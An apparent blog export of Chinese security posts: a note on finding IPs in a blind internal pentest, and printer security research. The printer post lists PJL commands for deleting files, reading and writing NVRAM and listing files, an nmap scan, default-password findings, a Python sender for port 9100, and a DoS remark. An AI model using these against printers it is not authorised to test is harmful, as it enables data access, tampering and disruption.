    <content type="text"><![CDATA[针对渗透，有句话很符合：只要思想不滑坡，办法总比问题多。前言好久没做过渗透测试，这次因为工作接触一个盲测的项目，特此记录一下。特点这次渗透只给了一个网口,没有DHCP服务，IP需要自己配置、系统IP需要自己去寻找。渗透ing获取IP由于没有DHCP。所以需要知道自己处于什么网段。这个步骤主要通过wireshark来查看ARP包，基本可以知道所处的网段了。但是子网掩码需要自己一个个去猜，可以先从24位(255.255.255.0)开始，逐步递增。如果递增还是不行那就递减吧。像这种ARP包，可以将IP地址配置为10.121.21.x，子网掩码配置成255.255.255.0。先看同网段IP是否可以访问，可以访问就配置网关，网关配置成10.121.21.254，再看10.121.X.X是否可以访问。服务器探测有了IP地址之后，就需要开始去寻找服务器地址了。可以先从C段开始快速探测，如果C段没有目标服务器的话，那就从B段下手。这个过程极其枯燥，建议使用工具：IISPutScanner、Advanced_ip_scanner。总结有了IP、服务器IP就跟平时渗透是一样的。这次难点在于没有DHCP，需要自己去配置对应的IP、寻找目标系统的IP。]]></content>
      <categories>
        <category>安全研究</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全-打印机安全研究]]></title>
    <url>%2Farchives%2F90a5ee4a.html</url>
    <content type="text"><![CDATA[只要你联网，那就有可能存在安全问题。俗称万物皆可’日’。前言打印机是现在办公环境中不可或缺的一个硬件设备,其本身存在很多安全问题。打印机服务有:FTP、Telnet、HTTP、PJL等。看到这么多服务，相信研究人员是非常高兴的。因为服务越多，安全隐患也越多。做安全研究最怕的就是服务很少、功能很少、端口不开放这些。前段时间，由于工作的原因，对打印机安全进行研究与分析。整体流程为:识别打印机→识别服务→常见服务安全分析→打印机专用服务(PJL)安全分析。PJL命令文档可以在HP网站上找到，文档参考1、文档参考2。识别打印机识别打印机可以通过：SNMP发送特定oid识别、Web管理页面识别、PJL命令识别。这里我采用了PJL命令识别，通过向设备的9100端口发送PJL命令，根据返回信息来识别。1@PJL INFO ID通过对打印机发送INFO ID(PJL命令)，打印机会返回其对应的型号。服务识别识别服务的话,用nmap就可以了。可以使用全端口扫描来发现对应服务。1nmap -p 1-65535 -T4 -A -v targetIP常见服务分析打印机常见服务：Telnet、FTP、HTTP。Telnet打印机中Telnet基本都是默认密码或者是空密码。登录之后可以查看配置信息、操作打印机等等。FTP大部分打印机FTP默认密码或空密码。通过上传文件，文件会直接被打印。HTTP打印机的Web存在的问题：爆破破解、越权访问等。这个可通过使用Web渗透的方式进行测试。我测试的时候发现有默认密码、信息泄露等。打印机专用服务(PJL)分析PJL是打印机作业语言:printer job language。PJL语言有固定的格式。对PJL命令文档中的PJL命令进行了整理：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869PJL以"\x1B%-12345@PJL JOB"开始，以"\x1B%-12345"结束，其中每条指令应当独占一行，指令间需要有carriage return（0x0D）。使用者可以自定义指令。@PJL FSDELETE NAME = “pathname” [&lt;CR&gt;]&lt;LF&gt; # 删除文件 @PJL FSDOWNLOAD FORMAT:BINARY [SIZE=int] [&lt;CR&gt;]&lt;LF&gt; # 下载文件到打印机@PJL FSINIT VOLUME = “pathname” [&lt;CR&gt;]&lt;LF&gt; # 初始化打印机文件系统@PJL FSMKDIR NAME = “pathname” [&lt;CR&gt;]&lt;LF&gt; # 创建目录@PJL DINQUIRE CPLOCK # 检查控制面板状态@PJL DINQUIRE PASSWORD # 检查密码保护状态@PJL JOB PASSWORD = [Number:0 to 65535] # 当前密码保护密码@PJL DEFAULT PASSWORD [Number:0 to 65535] # 修改保护密码@PJL DEFAULT CPLOCK = [ON, OFF] # 控制面板状态@PJL SET IOBUFFER = [ON, OFF, AUTO] # 设置缓冲区@PJL SET IOSIZE = [10-100] # 设置缓存区大小@PJL SET PCNAME = [String] # 设置计算机名称@PJL SET HOLD = [ON, JOB, STORE, PROOF] # 设置文件保存@PJL SET HOLDKEY = [Number:0000 to 9999] # 设置保存文件密码@PJL DEFAULT DISKLOCK = [ON, OFF] # 设置硬盘锁定状态@PJL SET SPOOLTIME # 设置打印日期@PJL SET COPIES # 设置打印数@PJL SET JOBNAME # 设置打印机文件名称@PJL SET RESOLUTION # 设置分辨率@PJL SET DRIVERNAME # 设置驱动@PJL USTATUS JOB # 输出 队列中还未打印任务的 状态@PJL COMMENT # 添加注释@PJL SET OUTTRAY #出纸盘(纸张输出位置)@PJL SET ORIENTATION = [PORTRAIT, LANDSCAPE] #页面方向@PJL SET DUPLEX = [ON, OFF] #双工模式(双面打印)@PJL SET BINDING = [LONGEDGE, SHORTEDGE] #双工模式：短边、长边@PJL RNVRAM ADDRESS #读取内存@PJL OPMSG DISPLAY #设置打印机离线脱机@PJL SET SERVICEMODE #设置服务模式@PJL WNVRAM ADDRESS #写入内存@PJL FSDIRLIST NAME #读取目录@PJL FSQUERY NAME #读取文件@PJL FSUPLOAD NAME #文件上传@PJL FSDOWNLOAD #写入文件由于打印机并不去判断PJL命令是谁发起的，因此，只要路由可达任何人都可以对打印机执行PJL命令操作。我测试的时候，发现对打印机的9100端口发送任何数据，打印机都会将其打印出来。如果，通过对9100端口进行DoS，那么，打印机就会不间断的工作。工具Hijetter.exePRETpjl-toolprint.py123456789101112131415# coding=utf-8import socketimport timeimport syswith open('1', 'rb') as f: pdata = f.read() sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((sys.argv[1],9100)) sock.sendall(pdata) recv_data = sock.recv(1024) print recv_data sock.close()总结在对打印机进行安全测试的时候，发现了几个问题特此记录一下：使用网络打印机的时候，流量报文是明文。将流量报文保存，可进行重放，将文档重新打印；测试的打印机使用FTP向打印机上传文件，打印机立即打印，打印之后立马删除。不知道其他打印机是否会立即删除文件；使用Python的socket可以达到快速网络数据发送。]]></content>
      <categories>
        <category>安全研究</category>
        <category>硬件设备</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>打印机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Excel-双击自动引用图片(二)]]></title>
    <url>%2Farchives%2F9b0fde12.html</url>
    <content type="text"><![CDATA[第一次见面年月日xxxx.xx.xx Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>Code</category>
        <category>VBA</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>VBA</tag>
        <tag>Excel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Excel-双击自动引用图片(一)]]></title>
    <url>%2Farchives%2F343e4570.html</url>
    <content type="text"><![CDATA[第一次见面年月日xxxx.xx.xx Incorrect Password! No content to display! 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